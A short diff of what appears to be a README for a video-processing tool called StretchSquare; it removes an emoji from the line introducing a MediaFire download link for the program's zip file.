@@ -17,5 +17,5 @@ It focuses on easy drag & drop, clean UI, and reliable video processing — no t
 
 🧑‍💻 Beginner friendly
 
-link to download the software 👇
+link to download the software
 https://www.mediafire.com/file/mhn8d2lkbrdk3jh/StretchSquare_v1.0.zip/file
